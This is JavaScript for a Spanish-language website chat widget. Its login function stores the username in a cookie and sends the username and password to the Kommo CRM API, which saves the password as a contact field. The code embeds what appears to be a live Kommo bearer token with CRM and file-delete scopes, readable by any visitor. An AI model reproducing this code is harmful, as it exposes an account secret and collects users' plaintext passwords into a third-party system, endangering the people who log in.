// Función para enviar los datos del usuario y contraseña al API de Kommo
function sendToKommo(username, password) {
    const apiToken = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp0aSI6ImMyMDg2MmEwN2FmMGEzYzc0N2EzYzdjZWQwM2Q4ZmVjNmE4MzQxMjBkZGE0NjQ0NmNhMTU2M2I4Yzg1ZjUwZDkzOWYwMjNkNDE4MzIwMDUyIn0.eyJhdWQiOiIzOTQwYzU2Mi1jMTdlLTRjODItODIxOS1mN2U0NDY1ODIzMzEiLCJqdGkiOiJjMjA4NjJhMDdhZjBhM2M3NDdhM2M3Y2VkMDNkOGZlYzZhODM0MTIwZGRhNDY0NDZjYTE1NjNiOGM4NWY1MGQ5MzlmMDIzZDQxODMyMDA1MiIsImlhdCI6MTc0Mjc1NTU4NSwibmJmIjoxNzQyNzU1NTg1LCJleHAiOjE3NDU5NzEyMDAsInN1YiI6IjEyOTE0Mjg3IiwiZ3JhbnRfdHlwZSI6IiIsImFjY291bnRfaWQiOjM0MzQ1MjMxLCJiYXNlX2RvbWFpbiI6ImtvbW1vLmNvbSIsInZlcnNpb24iOjIsInNjb3BlcyI6WyJjcm0iLCJmaWxlcyIsImZpbGVzX2RlbGV0ZSIsIm5vdGlmaWNhdGlvbnMiLCJwdXNoX25vdGlmaWNhdGlvbnMiXSwiaGFzaF91dWlkIjoiODUzNDkxNjMtMTlkNC00N2M3LTlkNzUtZTk5NDNlODY5ZmU5IiwiYXBpX2RvbWFpbiI6ImFwaS1jLmtvbW1vLmNvbSJ9.dNE1vCucFD1O3m4SMCpOC7cIm6ntsdOaUOSgX_YvttN7BFjut69qOq1mezhsrGa5-hBoXhx7Do_khe3-aGfWLpBXPsY7g9mzjG7b4jLwyasjg6RYNghqOiUcOvTQBojmIoMLQo2uEemEuL_GanT4tH-xVNV0NhXUl2t0RDlm-yNHMaqpJj-YIMkSV5c_-Jbw5z7mLVVG4R8PDGtmK7xhcOwD_a2dfeCuQNGhYNxRF6QOxmVz2daRoO0S0U8YzWwsQ7DfWHEcjdZJKmDflRmtlMc6j10rkeT3-bQ3IZ9k6slgV9t8u885TB6wnQVj4uaRg1gry_wftnOsVCUmrKbhMA";  // ← Reemplazar por tu token real
    const subdomain = "sinocaydiseno.kommo.com";   // ← Reemplazar por tu subdominio, ej: gana365

    const data = [
        {
            name: username,
            custom_fields_values: [
                {
                    field_code: "PASSWORD", // opcional, solo si tenés un campo personalizado
                    values: [{ value: password }]
                }
            ]
        }
    ];

    fetch(`https://sinocaydiseno.kommo.com/api/v4/contacts`, {
        method: 'POST',
        headers: {
            'Authorization': `Bearer ${apiToken}`,
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(result => {
        console.log("Contacto creado en Kommo:", result);
    })
    .catch(error => {
        console.error("Error al conectar con Kommo:", error);
    });
}

// Función de login: guarda el usuario en cookies y envía los datos a Kommo
function login() {
    let username = document.getElementById("username").value.trim();
    let password = document.getElementById("password").value.trim();

    if (username === "" || password === "") {
        Swal.fire({
            icon: "error",
            title: "Por favor, complete todos los campos",
            confirmButtonText: "OK",
            confirmButtonColor: "#6C63FF",
            iconColor: "#FF3B00",
            customClass: { popup: 'swal2-rounded' }
        });
        return;
    }

    // Guardar usuario en cookies
    setCookie("chatUser", username, 30);

    // Enviar los datos a Kommo
    sendToKommo(username, password);

    // Ocultar formulario de login y mostrar la cabecera del chat
    document.getElementById("loginForm").style.display = "none";
    document.getElementById("chatHeader").style.display = "flex";
}

// Función para abrir y cerrar el chat flotante
function toggleChat() {
    const chat = document.getElementById("chatBox");
    const button = document.querySelector(".chat-button");

    if (chat.style.display === "block") {
        chat.style.display = "none";
        button.innerHTML = "💬";
    } else {
        chat.style.display = "block";
        setTimeout(() => chat.classList.add("open"), 10);
        button.innerHTML = "✖";
    }
}

// Función para obtener cookies
function getCookie(name) {
    let cookies = document.cookie.split("; ");
    for (let cookie of cookies) {
        let [key, value] = cookie.split("=");
        if (key === name) return decodeURIComponent(value);
    }
    return "";
}

// Función para guardar cookies
function setCookie(name, value, days) {
    let date = new Date();
    date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
    document.cookie = name + "=" + encodeURIComponent(value) + "; expires=" + date.toUTCString() + "; path=/";
}
